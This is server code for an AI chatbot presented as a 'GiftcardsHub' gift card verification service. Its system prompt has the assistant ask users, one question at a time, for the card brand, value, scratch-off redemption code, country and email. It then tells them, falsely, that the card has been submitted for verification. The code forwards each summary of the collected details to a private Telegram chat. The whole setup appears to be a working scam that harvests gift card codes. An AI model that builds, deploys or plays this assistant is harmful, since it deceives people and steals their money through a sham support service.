import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import "https://deno.land/x/xhr@0.1.0/mod.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { messages, action } = await req.json();
    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    
    if (!LOVABLE_API_KEY) {
      throw new Error("LOVABLE_API_KEY is not configured");
    }

    // If action is 'send_summary', handle Telegram notification
    if (action === 'send_summary') {
      const summary = messages[messages.length - 1].content;
      console.log('Sending summary to Telegram:', summary);
      
      // Send to Telegram via existing notification function
      const TELEGRAM_BOT_TOKEN = Deno.env.get('TELEGRAM_BOT_TOKEN');
      const TELEGRAM_CHAT_ID = Deno.env.get('TELEGRAM_CHAT_ID');
      
      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        const telegramMessage = `💳 *Gift Card Request*\n\n${summary}`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: telegramMessage,
            parse_mode: 'Markdown'
          })
        });
      }
      
      return new Response(JSON.stringify({ success: true }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }

    // System prompt for the gift card support assistant
    const systemPrompt = `You are a professional Gift Card Support Assistant for GiftcardsHub.

**First Message ALWAYS:**
Start with a warm, friendly greeting: "Hello and welcome to GiftcardsHub! I'm here to assist you with your gift card verification. To get started, could you please tell me what type of gift card you have?"

**REQUIRED QUESTION FLOW (ask ONE at a time in this exact order):**
1. Card Type - Ask what type/brand of gift card they have (e.g., Amazon, Steam, iTunes, Walmart)
2. Card Value - Ask for the value or amount on the card
3. Code - Ask for the gift card code (explain it's usually found under the scratch-off area on the back of physical cards)
4. Country - Ask which country the gift card is from (this is important for verification)
5. Email - Ask for their email address where they'd like to receive the confirmation

**Response Style:**
- Write in a friendly, professional tone
- Give complete, helpful responses (not too brief)
- Use 2-4 sentences per reply
- Be conversational and natural
- Acknowledge what the user provides before asking the next question
- If the user seems confused, offer helpful guidance

**Core Rules:**
- Ask ONE question at a time, wait for their answer before moving to the next
- Never repeat back exactly what the user said
- Only respond to their most recent message
- Be patient and helpful

**When all 5 pieces of info are collected:**
Respond with: "Thank you for providing all the details! I've submitted your gift card for verification. You'll receive a confirmation email at [their email] within 1 hour. Is there anything else I can help you with?"

Be warm, professional, and helpful throughout the conversation.`;

    const response = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${LOVABLE_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: systemPrompt },
          ...messages
        ],
        stream: false,
      }),
    });

    if (!response.ok) {
      if (response.status === 429) {
        return new Response(JSON.stringify({ 
          error: "Rate limit exceeded. Please try again in a moment." 
        }), {
          status: 429,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      if (response.status === 402) {
        return new Response(JSON.stringify({ 
          error: "AI service temporarily unavailable." 
        }), {
          status: 402,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
      
      const errorText = await response.text();
      console.error("AI gateway error:", response.status, errorText);
      throw new Error("AI service error");
    }

    const data = await response.json();
    const aiMessage = data.choices[0].message.content;

    return new Response(JSON.stringify({ message: aiMessage }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });

  } catch (error) {
    console.error("Error in giftcard-support-chat:", error);
    return new Response(JSON.stringify({ 
      error: error instanceof Error ? error.message : "Unknown error" 
    }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
